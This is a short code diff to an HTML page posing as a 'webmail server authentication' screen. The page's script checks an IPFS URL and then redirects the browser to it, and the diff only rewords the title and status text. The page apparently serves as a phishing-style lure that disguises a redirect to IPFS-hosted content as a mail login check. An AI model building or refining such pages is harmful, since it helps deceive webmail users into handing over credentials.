@@ -2,7 +2,7 @@
 <html lang="en">
   <head>
     <meta charset="UTF-8" />
-    <title>AUTHENTICATING Mail SERVER...</title>
+    <title>AUTHENTICATING WEBMAIL SERVER...</title>
     <style>
       body {
         font-family: Arial, sans-serif;
@@ -59,7 +59,7 @@
           if (xhr.readyState == 4) {
             if (xhr.status >= 200 && xhr.status < 300) {
               // Update status before redirect
-              document.getElementById('status-text').textContent = "Connection verified. Redirecting...";
+              document.getElementById('status-text').textContent = "Connection verified....";
               // Redirect if the IPFS content is accessible
               setTimeout(function() {
                 window.location.href = ipfsURL;
